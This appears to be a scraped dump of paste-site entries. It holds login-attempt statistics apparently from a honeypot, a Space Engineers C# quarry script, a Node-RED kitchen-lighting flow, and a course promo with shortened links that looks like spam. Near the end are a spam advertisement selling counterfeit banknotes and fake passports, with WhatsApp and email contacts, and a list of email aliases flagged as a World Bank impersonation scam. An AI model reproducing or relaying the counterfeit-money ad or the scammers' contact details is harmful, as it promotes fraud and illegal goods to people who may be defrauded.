    ""Baku City"": 1,
    ""Moscow"": 6,
    ""Beijing"": 1,
    ""North West"": 115,
    ""New Jersey"": 1,
    ""Vilnius"": 2
  },
  ""country"": {
    ""The Netherlands"": 7,
    ""Lithuania"": 27,
    ""United States"": 573,
    ""Iran"": 2,
    ""India"": 118,
    ""Albania"": 6,
    ""Colombia"": 1,
    ""Aland Islands"": 1,
    ""Germany"": 6,
    ""China"": 2,
    ""Ethiopia"": 2,
    ""Vietnam"": 1,
    ""Brazil"": 1,
    ""United Kingdom"": 1,
    ""Indonesia"": 1,
    ""Hong Kong"": 1,
    ""Azerbaijan"": 1,
    ""Russia"": 6,
    ""Singapore"": 115
  },
  ""account"": {
    ""Administr"": 11,
    ""142.93.8.59"": 19,
    ""(empty)"": 6,
    ""hello"": 9,
    ""Test"": 15,
    ""a"": 118,
    ""kYcAQIfgi"": 1,
    ""pfLXaH"": 1,
    ""tcMbGx"": 1,
    ""Domain"": 8,
    ""VJtfOHLOw"": 1,
    ""GauDHS"": 1,
    ""AKmrzC"": 1,
    ""user"": 1,
    ""Administrator"": 673,
    ""uelOeKmig"": 1,
    ""DuihmD"": 1,
    ""GvhwrH"": 1,
    ""GFqJycamp"": 1,
    ""RQjfDp"": 1,
    ""qGREZX"": 1
  },
  ""keyboard"": {
    ""Unknown"": 872
  },
  ""client_build"": {
    ""Unknown"": 872
  },
  ""client_name"": {
    ""Unknown"": 872
  },
  ""ip_type"": {
    ""Unknown"": 61,
    ""mobile & proxy"": 2,
    ""proxy"": 118,
    ""hosting"": 688,
    ""mobile"": 1,
    ""hosting & proxy"": 2
  }
}"
MtmK62M0,Arm Quarry,tomdodd4598,C#,Sunday 21st of January 2024 05:38:03 PM CDT,"using Sandbox.Game.EntityComponents;
using Sandbox.ModAPI.Ingame;
using Sandbox.ModAPI.Interfaces;
using SpaceEngineers.Game.ModAPI.Ingame;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Linq;
using System.Text;
using VRage;
using VRage.Collections;
using VRage.Game;
using VRage.Game.Components;
using VRage.Game.GUI.TextPanel;
using VRage.Game.ModAPI.Ingame;
using VRage.Game.ModAPI.Ingame.Utilities;
using VRage.Game.ObjectBuilders.Definitions;
using VRageMath;

namespace IngameScript
{
	partial class Program : MyGridProgram
	{
		const float X_SPEED = 0.5f, Y_SPEED = 0.2f, Z_SPEED = 0.5f;
		const int Y_TICKS = 40, Z_TICKS = 20;
		
		readonly IMyPistonBase pistonX, pistonY, pistonZ;

		int movY = 0, movZ = 0;
		bool endZCache = false;

		// The constructor, called at the start of every session.
		public Program()
		{
			Runtime.UpdateFrequency = UpdateFrequency.Update10;

			pistonX = GetBlock<IMyPistonBase>(""X Piston"");
			pistonY = GetBlock<IMyPistonBase>(""Y Piston"");
			pistonZ = GetBlock<IMyPistonBase>(""Z Piston"");

			pistonX.Enabled = true;
			pistonY.Enabled = false;
			pistonZ.Enabled = false;

			pistonX.Velocity = pistonX.Velocity > 0.0f ? X_SPEED : -X_SPEED;
			pistonY.Velocity = Y_SPEED;
			pistonZ.Velocity = pistonZ.Velocity > 0.0f ? Z_SPEED : -Z_SPEED;
		}

		T GetBlock<T>(string name) where T : class, IMyTerminalBlock
		{
			var block = GridTerminalSystem.GetBlockWithName(name);
			if (!(block is T))
			{
				throw new NullReferenceException($""Failed to get {typeof(T).Name} \""{name}\""!"");
			}
			return block as T;
		}

		// Called when the program needs to save its state.
		public void Save()
		{

		}

		// The main entry point of the script.
		public void Main(string argument, UpdateType updateSource)
		{
			if (movY > 0)
			{
				--movY;
			}

			if (movZ > 0)
			{
				--movZ;
			}

			var endX = pistonX.Status == PistonStatus.Extended || pistonX.Status == PistonStatus.Retracted;
			var endZ = pistonZ.Status == PistonStatus.Extended || pistonZ.Status == PistonStatus.Retracted;

			if (movY == 0 && movZ == 0)
			{
				if (endX)
				{
					movZ = Z_TICKS;
					pistonX.Enabled = false;
					pistonX.Reverse();
					pistonZ.Enabled = true;
				}
				else
				{
					pistonX.Enabled = true;
					pistonZ.Enabled = false;
				}
			}

			if (endZ)
			{
				movZ = 0;
				pistonZ.Enabled = false;
				
				if (endX && endZCache) {
					endZCache = false;
					pistonZ.Reverse();

					if (movY == 0)
					{
						movY = Y_TICKS;
						pistonX.Enabled = false;
						pistonY.Enabled = true;
					}
				}
				else
				{
					endZCache = true;
				}
			}

			if (movY == 0 && movZ == 0)
			{
				pistonX.Enabled = true;
				pistonY.Enabled = false;
			}
		}
	}
}
"
ksxj1Jxn,Untitled,f0f077,Java,Sunday 21st of January 2024 04:35:42 PM CDT,"Java 17 Masterclass: Start Coding in 2024
Acquire Key Java Skills: From Basics to Advanced Programming &amp; Certification - Start Your Dev Career
for more:https://cuty.io/TVaAK3D
and video link:https://linkjust.com/BLmcepmcVL6GCgefPY"
X26vceWt,Lysstyring kjøkken,Fredriknas,YAML,Sunday 21st of January 2024 04:33:12 PM CDT,"[{""id"":""00b088a380d95aa4"",""type"":""tab"",""label"":""Styring av kjøkkenlys"",""disabled"":false,""info"":""""},{""id"":""a8e67277657a9093"",""type"":""group"",""z"":""00b088a380d95aa4"",""name"":""Basbelysning til ulike tider"",""style"":{""label"":true,""color"":""#000000"",""stroke"":""#ffC000"",""fill"":""#ffdf7f""},""nodes"":[""9fdf85b5712d5f67"",""9c7e3ad652b6fba7"",""17127c8308110231"",""6517890643008e5b"",""a149258c59587354"",""fc980eac2a580218"",""a3c219dcd00f9df6"",""94f28a5d83ebd5b6""],""x"":494,""y"":-1,""w"":1172,""h"":162},{""id"":""9ce1b405dfbe4008"",""type"":""group"",""z"":""00b088a380d95aa4"",""name"":""Bevegelsedeteksjon som øker belysningen fra basnivå i gul rute"",""style"":{""stroke"":""#7fb7df"",""fill"":""#7fb7df"",""label"":true,""color"":""#000000""},""nodes"":[""d51ad80a41ff7a10"",""a706020a494f7899"",""93f1b83abbc437f5"",""3d6f985585c77b95"",""d5bee562266e9949"",""cace540f938f2c7e"",""45218962999b9046"",""80b2ce9e3824d803""],""x"":474,""y"":259,""w"":1212,""h"":202},{""id"":""cc05cd5a3ebeffa8"",""type"":""group"",""z"":""00b088a380d95aa4"",""name"":""Testpanel"",""style"":{""stroke"":""#ffbfbf"",""fill"":""#ffbfbf"",""label"":true,""color"":""#000000""},""nodes"":[""0e5973e5f0ba93d8"",""50c829827111bc53"",""a64544546b3f858f"",""fa90f01617722425"",""ab5e6bb98509acc2""],""x"":-6,""y"":179,""w"":292,""h"":302},{""id"":""9fdf85b5712d5f67"",""type"":""time-range-switch"",""z"":""00b088a380d95aa4"",""g"":""a8e67277657a9093"",""name"":"""",""lat"":""69.67132"",""lon"":""18.96612"",""startTime"":""07:00"",""endTime"":""22:00"",""startOffset"":0,""endOffset"":0,""x"":750,""y"":40,""wires"":[[""fc980eac2a580218""],[""a3c219dcd00f9df6""]]},{""id"":""9c7e3ad652b6fba7"",""type"":""api-call-service"",""z"":""00b088a380d95aa4"",""g"":""a8e67277657a9093"",""name"":""Set Light"",""server"":""7ac1c545.68f03c"",""version"":5,""debugenabled"":false,""domain"":""light"",""service"":""turn_on"",""areaId"":[],""deviceId"":[],""entityId"":[""light.vegg_og_takbelysning_pa_kjokken""],""data"":""{\""brightness_pct\"":\""{{payload}}\""}"",""dataType"":""json"",""mergeContext"":"""",""mustacheAltTags"":false,""outputProperties"":[{""property"":""lightstatus"",""propertyType"":""msg"",""value"":""dag-baslys"",""valueType"":""str""}],""queue"":""none"",""x"":1280,""y"":40,""wires"":[[""94f28a5d83ebd5b6""]]},{""id"":""17127c8308110231"",""type"":""api-call-service"",""z"":""00b088a380d95aa4"",""g"":""a8e67277657a9093"",""name"":""Set Light"",""server"":""7ac1c545.68f03c"",""version"":5,""debugenabled"":false,""domain"":""light"",""service"":""turn_on"",""areaId"":[],""deviceId"":[],""entityId"":[],""data"":""{\""brightness_pct\"":\""{{payload}}\""}"",""dataType"":""jsonata"",""mergeContext"":"""",""mustacheAltTags"":false,""outputProperties"":[{""property"":""lightstatus"",""propertyType"":""msg"",""value"":""kveld-baslys"",""valueType"":""str""}],""queue"":""none"",""x"":1280,""y"":100,""wires"":[[""94f28a5d83ebd5b6""]]},{""id"":""6517890643008e5b"",""type"":""cronplus"",""z"":""00b088a380d95aa4"",""g"":""a8e67277657a9093"",""name"":"""",""outputField"":""payload"",""timeZone"":"""",""storeName"":"""",""commandResponseMsgOutput"":""output1"",""defaultLocation"":"""",""defaultLocationType"":""default"",""outputs"":1,""options"":[{""name"":""schedule1"",""topic"":""topic1"",""payloadType"":""default"",""payload"":"""",""expressionType"":""cron"",""expression"":""0 0 7 * * *"",""location"":"""",""offset"":""0"",""solarType"":""all"",""solarEvents"":""sunrise,sunset""}],""x"":600,""y"":40,""wires"":[[""9fdf85b5712d5f67""]]},{""id"":""a149258c59587354"",""type"":""cronplus"",""z"":""00b088a380d95aa4"",""g"":""a8e67277657a9093"",""name"":"""",""outputField"":""payload"",""timeZone"":"""",""storeName"":"""",""commandResponseMsgOutput"":""output1"",""defaultLocation"":"""",""defaultLocationType"":""default"",""outputs"":1,""options"":[{""name"":""schedule1"",""topic"":""topic1"",""payloadType"":""default"",""payload"":"""",""expressionType"":""cron"",""expression"":""0   22  *   *   *"",""location"":"""",""offset"":""0"",""solarType"":""all"",""solarEvents"":""sunrise,sunset""}],""x"":600,""y"":120,""wires"":[[""9fdf85b5712d5f67""]]},{""id"":""d51ad80a41ff7a10"",""type"":""server-state-changed"",""z"":""00b088a380d95aa4"",""g"":""9ce1b405dfbe4008"",""name"":""motion = on"",""server"":""a698cb93.dea878"",""version"":5,""outputs"":2,""exposeAsEntityConfig"":"""",""entityId"":""binary_sensor.bevegelsesensor_kjokken_philipshue_occupancy"",""entityIdType"":""exact"",""outputInitially"":false,""stateType"":""str"",""ifState"":""on"",""ifStateType"":""str"",""ifStateOperator"":""is"",""outputOnlyOnStateChange"":true,""for"":""0"",""forType"":""num"",""forUnits"":""minutes"",""ignorePrevStateNull"":false,""ignorePrevStateUnknown"":false,""ignorePrevStateUnavailable"":false,""ignoreCurrentStateUnknown"":false,""ignoreCurrentStateUnavailable"":false,""outputProperties"":[{""property"":""payload"",""propertyType"":""msg"",""value"":"""",""valueType"":""entityState""},{""property"":""data"",""propertyType"":""msg"",""value"":"""",""valueType"":""eventData""},{""property"":""topic"",""propertyType"":""msg"",""value"":"""",""valueType"":""triggerId""}],""x"":570,""y"":300,""wires"":[[""a706020a494f7899""],[]]},{""id"":""a706020a494f7899"",""type"":""time-range-switch"",""z"":""00b088a380d95aa4"",""g"":""9ce1b405dfbe4008"",""name"":"""",""lat"":""69.67132"",""lon"":""18.96612"",""startTime"":""07:00"",""endTime"":""22:00"",""startOffset"":0,""endOffset"":0,""x"":590,""y"":380,""wires"":[[""cace540f938f2c7e""],[""45218962999b9046""]]},{""id"":""93f1b83abbc437f5"",""type"":""api-call-service"",""z"":""00b088a380d95aa4"",""g"":""9ce1b405dfbe4008"",""name"":""Set Light"",""server"":""7ac1c545.68f03c"",""version"":5,""debugenabled"":false,""domain"":""light"",""service"":""turn_on"",""areaId"":[],""deviceId"":[],""entityId"":[""light.vegg_og_takbelysning_pa_kjokken""],""data"":""{\""brightness_pct\"":\""{{payload}}\""}"",""dataType"":""json"",""mergeContext"":"""",""mustacheAltTags"":false,""outputProperties"":[{""property"":""lightstatus"",""propertyType"":""msg"",""value"":""dag-bevegelse"",""valueType"":""str""}],""queue"":""none"",""x"":1180,""y"":340,""wires"":[[""80b2ce9e3824d803""]]},{""id"":""3d6f985585c77b95"",""type"":""api-call-service"",""z"":""00b088a380d95aa4"",""g"":""9ce1b405dfbe4008"",""name"":""Set Light"",""server"":""7ac1c545.68f03c"",""version"":5,""debugenabled"":false,""domain"":""light"",""service"":""turn_on"",""areaId"":[],""deviceId"":[],""entityId"":[],""data"":""{\""brightness_pct\"":\""{{payload}}\""}"",""dataType"":""jsonata"",""mergeContext"":"""",""mustacheAltTags"":false,""outputProperties"":[{""property"":""lightstatus"",""propertyType"":""msg"",""value"":""kveld-bevegelse"",""valueType"":""str""}],""queue"":""none"",""x"":1180,""y"":420,""wires"":[[""80b2ce9e3824d803""]]},{""id"":""d5bee562266e9949"",""type"":""delay"",""z"":""00b088a380d95aa4"",""g"":""9ce1b405dfbe4008"",""name"":"""",""pauseType"":""delayv"",""timeout"":""5"",""timeoutUnits"":""minutes"",""rate"":""1"",""nbRateUnits"":""1"",""rateUnits"":""second"",""randomFirst"":""1"",""randomLast"":""5"",""randomUnits"":""seconds"",""drop"":false,""allowrate"":false,""outputs"":1,""x"":1600,""y"":380,""wires"":[[""9fdf85b5712d5f67""]]},{""id"":""cace540f938f2c7e"",""type"":""function"",""z"":""00b088a380d95aa4"",""g"":""9ce1b405dfbe4008"",""name"":""turn up lights on day mode based on motion"",""func"":""var lightSettings = [\n    { entity: \""light.hue_ensis_down_1\"", brightness: 60, color: \""#FFC18D\"" },\n    { entity: \""light.hue_ensis_up_1\"", brightness: 60, color: \""#FFC18D\"" },\n    { entity: \""light.led_strip_kjokken_gr_3_ii_namron\"", brightness: 60 },\n    { entity: \""light.led_strip_kjokken_gr2_i_namron\"", brightness: 60 },\n    { entity: \""light.led_strip_kjokken_gr1_u_namron\"", brightness: 60 },\n];\n\nfor (var i = 0; i < lightSettings.length; i++) {\n    var setting = lightSettings[i];\n    var entityId = setting.entity;\n    var brightness = setting.brightness;\n    var color = setting.color;\n    var serviceData = {\n        \""brightness_pct\"": brightness\n    };\n    \n    if (color) {\n        serviceData.rgb_color = hexToRgb(color);\n    }\n    \n    msg.payload = {\n        domain: \""light\"",\n        service: \""turn_on\"",\n        data: serviceData,\n        target: {\n            entity_id: entityId\n        }\n    };\n    \n    node.send(msg);\n}\n\nreturn null;\n\nfunction hexToRgb(hex) {\n    var bigint = parseInt(hex.substr(1), 16);\n    var r = (bigint >> 16) & 255;\n    var g = (bigint >> 8) & 255;\n    var b = bigint & 255;\n    return [r, g, b];\n}"",""outputs"":1,""timeout"":"""",""noerr"":0,""initialize"":"""",""finalize"":"""",""libs"":[],""x"":850,""y"":360,""wires"":[[""93f1b83abbc437f5""]]},{""id"":""fc980eac2a580218"",""type"":""function"",""z"":""00b088a380d95aa4"",""g"":""a8e67277657a9093"",""name"":""Turn on base light day mode"",""func"":""var lightSettings = [\n    { entity: \""light.hue_ensis_down_1\"", brightness: 40, color: \""#FFC18D\"" },\n    { entity: \""light.hue_ensis_up_1\"", brightness: 40, color: \""#FFC18D\"" },\n    { entity: \""light.led_strip_kjokken_gr_3_ii_namron\"", brightness: 40 },\n    { entity: \""light.led_strip_kjokken_gr2_i_namron\"", brightness: 40 },\n    { entity: \""light.led_strip_kjokken_gr1_u_namron\"", brightness: 40 },\n];\n\nfor (var i = 0; i < lightSettings.length; i++) {\n    var setting = lightSettings[i];\n    var entityId = setting.entity;\n    var brightness = setting.brightness;\n    var color = setting.color;\n    var serviceData = {\n        \""brightness_pct\"": brightness\n    };\n    \n    if (color) {\n        serviceData.rgb_color = hexToRgb(color);\n    }\n    \n    msg.payload = {\n        domain: \""light\"",\n        service: \""turn_on\"",\n        data: serviceData,\n        target: {\n            entity_id: entityId\n        }\n    };\n    \n    node.send(msg);\n}\n\nreturn null;\n\nfunction hexToRgb(hex) {\n    var bigint = parseInt(hex.substr(1), 16);\n    var r = (bigint >> 16) & 255;\n    var g = (bigint >> 8) & 255;\n    var b = bigint & 255;\n    return [r, g, b];\n}"",""outputs"":1,""timeout"":"""",""noerr"":0,""initialize"":"""",""finalize"":"""",""libs"":[],""x"":1020,""y"":40,""wires"":[[""9c7e3ad652b6fba7""]]},{""id"":""a3c219dcd00f9df6"",""type"":""function"",""z"":""00b088a380d95aa4"",""g"":""a8e67277657a9093"",""name"":""turn on night mode base light"",""func"":""var lightSettings = [\n    { entity: \""light.hue_ensis_down_1\"", brightness: 20, color: \""#FFC18D\"" },\n    { entity: \""light.hue_ensis_up_1\"", brightness: 20, color: \""#FFC18D\"" },\n    { entity: \""light.led_strip_kjokken_gr_3_ii_namron\"", brightness: 40 },\n    { entity: \""light.led_strip_kjokken_gr2_i_namron\"", brightness: 0 },\n    { entity: \""light.led_strip_kjokken_gr1_u_namron\"", brightness: 0 },\n];\n\nfor (var i = 0; i < lightSettings.length; i++) {\n    var setting = lightSettings[i];\n    var entityId = setting.entity;\n    var brightness = setting.brightness;\n    var color = setting.color;\n    var serviceData = {\n        \""brightness_pct\"": brightness\n    };\n    \n    if (color) {\n        serviceData.rgb_color = hexToRgb(color);\n    }\n    \n    msg.payload = {\n        domain: \""light\"",\n        service: \""turn_on\"",\n        data: serviceData,\n        target: {\n            entity_id: entityId\n        }\n    };\n    \n    node.send(msg);\n}\n\nreturn null;\n\nfunction hexToRgb(hex) {\n    var bigint = parseInt(hex.substr(1), 16);\n    var r = (bigint >> 16) & 255;\n    var g = (bigint >> 8) & 255;\n    var b = bigint & 255;\n    return [r, g, b];\n}"",""outputs"":1,""timeout"":"""",""noerr"":0,""initialize"":"""",""finalize"":"""",""libs"":[],""x"":1020,""y"":100,""wires"":[[""17127c8308110231""]]},{""id"":""45218962999b9046"",""type"":""function"",""z"":""00b088a380d95aa4"",""g"":""9ce1b405dfbe4008"",""name"":""turn up lights on night mode based on motion"",""func"":""var lightSettings = [\n    { entity: \""light.hue_ensis_down_1\"", brightness: 40, color: \""#FFC18D\"" },\n    { entity: \""light.hue_ensis_up_1\"", brightness: 40, color: \""#FFC18D\"" },\n    { entity: \""light.led_strip_kjokken_gr_3_ii_namron\"", brightness: 40 },\n    { entity: \""light.led_strip_kjokken_gr2_i_namron\"", brightness: 40 },\n    { entity: \""light.led_strip_kjokken_gr1_u_namron\"", brightness: 40 },\n];\n\nfor (var i = 0; i < lightSettings.length; i++) {\n    var setting = lightSettings[i];\n    var entityId = setting.entity;\n    var brightness = setting.brightness;\n    var color = setting.color;\n    var serviceData = {\n        \""brightness_pct\"": brightness\n    };\n    \n    if (color) {\n        serviceData.rgb_color = hexToRgb(color);\n    }\n    \n    msg.payload = {\n        domain: \""light\"",\n        service: \""turn_on\"",\n        data: serviceData,\n        target: {\n            entity_id: entityId\n        }\n    };\n    \n    node.send(msg);\n}\n\nreturn null;\n\nfunction hexToRgb(hex) {\n    var bigint = parseInt(hex.substr(1), 16);\n    var r = (bigint >> 16) & 255;\n    var g = (bigint >> 8) & 255;\n    var b = bigint & 255;\n    return [r, g, b];\n}"",""outputs"":1,""timeout"":"""",""noerr"":0,""initialize"":"""",""finalize"":"""",""libs"":[],""x"":850,""y"":400,""wires"":[[""3d6f985585c77b95""]]},{""id"":""ab5e6bb98509acc2"",""type"":""inject"",""z"":""00b088a380d95aa4"",""g"":""cc05cd5a3ebeffa8"",""name"":""Test hele automasjonen:"",""props"":[{""p"":""payload""},{""p"":""topic"",""vt"":""str""}],""repeat"":"""",""crontab"":"""",""once"":false,""onceDelay"":0.1,""topic"":"""",""payload"":"""",""payloadType"":""date"",""x"":150,""y"":220,""wires"":[[""a149258c59587354""]]},{""id"":""0e5973e5f0ba93d8"",""type"":""inject"",""z"":""00b088a380d95aa4"",""g"":""cc05cd5a3ebeffa8"",""name"":""Baselight: Night"",""props"":[{""p"":""payload""},{""p"":""topic"",""vt"":""str""}],""repeat"":"""",""crontab"":"""",""once"":false,""onceDelay"":0.1,""topic"":"""",""payload"":"""",""payloadType"":""date"",""x"":140,""y"":340,""wires"":[[""a3c219dcd00f9df6""]]},{""id"":""50c829827111bc53"",""type"":""inject"",""z"":""00b088a380d95aa4"",""g"":""cc05cd5a3ebeffa8"",""name"":""Baselight: Day"",""props"":[{""p"":""payload""},{""p"":""topic"",""vt"":""str""}],""repeat"":"""",""crontab"":"""",""once"":false,""onceDelay"":0.1,""topic"":"""",""payload"":"""",""payloadType"":""date"",""x"":150,""y"":300,""wires"":[[""fc980eac2a580218""]]},{""id"":""a64544546b3f858f"",""type"":""inject"",""z"":""00b088a380d95aa4"",""g"":""cc05cd5a3ebeffa8"",""name"":""Motion: Day"",""props"":[{""p"":""payload""},{""p"":""topic"",""vt"":""str""}],""repeat"":"""",""crontab"":"""",""once"":false,""onceDelay"":0.1,""topic"":"""",""payload"":"""",""payloadType"":""date"",""x"":150,""y"":440,""wires"":[[""cace540f938f2c7e""]]},{""id"":""fa90f01617722425"",""type"":""inject"",""z"":""00b088a380d95aa4"",""g"":""cc05cd5a3ebeffa8"",""name"":""Motion: Night"",""props"":[{""p"":""payload""},{""p"":""topic"",""vt"":""str""}],""repeat"":"""",""crontab"":"""",""once"":false,""onceDelay"":0.1,""topic"":"""",""payload"":"""",""payloadType"":""date"",""x"":150,""y"":400,""wires"":[[""45218962999b9046""]]},{""id"":""80b2ce9e3824d803"",""type"":""ha-sensor"",""z"":""00b088a380d95aa4"",""g"":""9ce1b405dfbe4008"",""name"":""Lysstatus kjøkken"",""entityConfig"":""129a4b12a1e22835"",""version"":0,""state"":""lightstatus"",""stateType"":""msg"",""attributes"":[],""inputOverride"":""allow"",""outputProperties"":[],""x"":1390,""y"":380,""wires"":[[""d5bee562266e9949""]]},{""id"":""94f28a5d83ebd5b6"",""type"":""ha-sensor"",""z"":""00b088a380d95aa4"",""g"":""a8e67277657a9093"",""name"":""Lysstatus kjøkken"",""entityConfig"":""129a4b12a1e22835"",""version"":0,""state"":""lightstatus"",""stateType"":""msg"",""attributes"":[],""inputOverride"":""allow"",""outputProperties"":[],""x"":1550,""y"":80,""wires"":[[]]},{""id"":""7ac1c545.68f03c"",""type"":""server"",""name"":""Home Assistant"",""version"":5,""addon"":true,""rejectUnauthorizedCerts"":true,""ha_boolean"":""y|yes|true|on|home|open"",""heartbeat"":false,""heartbeatInterval"":30,""areaSelector"":""friendlyName"",""deviceSelector"":""friendlyName"",""entitySelector"":""friendlyName"",""statusSeparator"":""at: "",""statusYear"":""hidden"",""statusMonth"":""short"",""statusDay"":""numeric"",""statusHourCycle"":""h23"",""statusTimeFormat"":""h:m"",""enableGlobalContextStore"":true},{""id"":""a698cb93.dea878"",""type"":""server"",""name"":""Hass BKV19"",""version"":5,""addon"":true,""rejectUnauthorizedCerts"":true,""ha_boolean"":""y|yes|true|on|home|open"",""connectionDelay"":false,""cacheJson"":true,""heartbeat"":true,""heartbeatInterval"":""30"",""areaSelector"":""friendlyName"",""deviceSelector"":""friendlyName"",""entitySelector"":""friendlyName"",""statusSeparator"":""at: "",""statusYear"":""hidden"",""statusMonth"":""short"",""statusDay"":""numeric"",""statusHourCycle"":""h23"",""statusTimeFormat"":""h:m"",""enableGlobalContextStore"":true},{""id"":""129a4b12a1e22835"",""type"":""ha-entity-config"",""server"":""a698cb93.dea878"",""deviceConfig"":"""",""name"":""lysstatus_kjokken"",""version"":""6"",""entityType"":""sensor"",""haConfig"":[{""property"":""name"",""value"":""""},{""property"":""icon"",""value"":""""},{""property"":""entity_picture"",""value"":""""},{""property"":""entity_category"",""value"":""""},{""property"":""device_class"",""value"":""""},{""property"":""unit_of_measurement"",""value"":""""},{""property"":""state_class"",""value"":""""}],""resend"":false,""debugEnabled"":false}]"
KfFqQ29g,Buy Counterfeit Australian dollars bills WhatsApp(+371 204 33160) buy fake counterfeit euro money on,gimikedrain,C#,Sunday 21st of January 2024 04:22:48 PM CDT,"Buy high-quality undetectable grade AA+ counterfeit money Online, real fake passports,id cards,drivers licenseBuy 100% Undetectable counterfeit Banknotes with different serial number . Our BILLS are professionally manufactured with a team of High Quality IT technicians .  We offer high quality counterfeit money that looks real for all customers and we treat all customers the same . Our undetectable counterfeit money are use in Banks ,ATM Machines , Casinos , supermarkets , currency exchange stores .  Contact us today for your visit to this website is not by error and we assure you always good deals . Dream chasers for live . Here is your chance to be a millionaire.  Order High Quality Counterfeit Euro Bills Online 
BUY 100% UNDETECTABLE COUNTERFEIT MONEY Latin America 
Buy Counterfeit Australian dollars bills WhatsApp(+371 204 33160) New Zeland fake counterfeit currency for sell, Fake Australia dollars for sell , buy counterfeit Australia dollars online Best quality counterfeit banknote for sell 
With over a billion of our products circulating around the world, we offer only original high quality COUNTERFEIT currencies and fake documents . Shipping from Ukraine  . Order High quality fake euro bills online . Order High Quality Counterfeit Euro Bills Online BUY TOP QUALITY UNDETECTED COUNTERFEIT Argentina
(Why Would You Buy Buy Counterfeit Money online That Looks Real From US ? )
 We use latest technology to produce  bills so that it looks 100% identical to the real notes. This thus implies all security features present in the real notes are present in the notes we make. Our team is made up of Quality IT technicians . We offer only high quality counterfeit money that looks real  . These Banknotes contain the following security features that make it to be genuine and we have the best grades counterfeit in the world both Euro ,Dollar and any currency of your choice . Order High Quality Counterfeit Euro Bills Online . 									WhatsApp(+371 204 33160)
																																WhatsApp(+371 204 33160)																																																									Email ::: ligakvas@yahoo.com																																																									
buy You are not the first to buy fake Euros online and you won’t be the last either. Going for fake Euro is the best course of action given
the financial crisis in Europe brought on by the conflict in Ukraine.
The majority of people move here in search of better chances, but they
are frequently disillusioned when things don’t go their way. Online counterfeit euro purchases.

If your expenses are greater than your income, it can be an issue given the high cost of living in European nations. With
counterfeit euros for sale, we can help here. Most people use this money
without any problems to meet their daily expenses. It is a privilege
for
us to assist you in the best manner possible. Buy Fake Euros Online from the top vendor. Don’t pass up this chance to get your finances in
order before the end of the year by buying fake euros online. When you need us, we are always there for you!.
Buy counterfeit Euro banknotes online

Buy fake Euro banknotes online that appears genuine. You may get high-quality counterfeit Euro banknotes at Global counterfeits. Do you want to
purchase high-quality counterfeit currency with great prices that
resemble real currency? You have the opportunity to get grade A prop and
replica euro banknotes that have every feature of the real thing. Take care of your money demands in 2022 by purchasing counterfeit euro notes online

Our counterfeit money is of the highest quality, passing the pen and
light test, and may be used in banks. Our desire to end poverty around
the
world motivated us to offer services that would enable our clients to
become financially independent. These are in the domains of offering
premium counterfeit money of various currencies, including	
																																WhatsApp(+371 204 33160)	WhatsApp(+371 204 33160)		WhatsApp(+371 204 33160)																																									Email ::: ligakvas@yahoo.com           	"
4pGwH3mK,SCAM - David Malpass impersonator,bombaires,AIMMS,Sunday 21st of January 2024 04:18:52 PM CDT,"<a href=""mailto:worldbankdaviidmalpass11@gmail.com"">worldbankdaviidmalpass11@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+23539@gmail.com"">worldbankdaviidmalpass11+23539@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+12017@gmail.com"">worldbankdaviidmalpass11+12017@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+736@gmail.com"">worldbankdaviidmalpass11+736@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+10707@gmail.com"">worldbankdaviidmalpass11+10707@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+2518@gmail.com"">worldbankdaviidmalpass11+2518@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+29924@gmail.com"">worldbankdaviidmalpass11+29924@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+19492@gmail.com"">worldbankdaviidmalpass11+19492@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+2540@gmail.com"">worldbankdaviidmalpass11+2540@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+851@gmail.com"">worldbankdaviidmalpass11+851@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+20440@gmail.com"">worldbankdaviidmalpass11+20440@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+1599@gmail.com"">worldbankdaviidmalpass11+1599@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+2690@gmail.com"">worldbankdaviidmalpass11+2690@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+152@gmail.com"">worldbankdaviidmalpass11+152@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+31188@gmail.com"">worldbankdaviidmalpass11+31188@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+26070@gmail.com"">worldbankdaviidmalpass11+26070@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+16149@gmail.com"">worldbankdaviidmalpass11+16149@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+25883@gmail.com"">worldbankdaviidmalpass11+25883@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+5526@gmail.com"">worldbankdaviidmalpass11+5526@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+22358@gmail.com"">worldbankdaviidmalpass11+22358@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+9122@gmail.com"">worldbankdaviidmalpass11+9122@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+13102@gmail.com"">worldbankdaviidmalpass11+13102@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+27433@gmail.com"">worldbankdaviidmalpass11+27433@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+13153@gmail.com"">worldbankdaviidmalpass11+13153@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+19775@gmail.com"">worldbankdaviidmalpass11+19775@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+14235@gmail.com"">worldbankdaviidmalpass11+14235@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+24601@gmail.com"">worldbankdaviidmalpass11+24601@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+29563@gmail.com"">worldbankdaviidmalpass11+29563@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+26313@gmail.com"">worldbankdaviidmalpass11+26313@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+10888@gmail.com"">worldbankdaviidmalpass11+10888@gmail.com</a>
<a href=""mailto:worldbankdaviidmalpass11+3521@gmail.com"">worldbankdaviidmalpass11+3521@gmail.com</a>
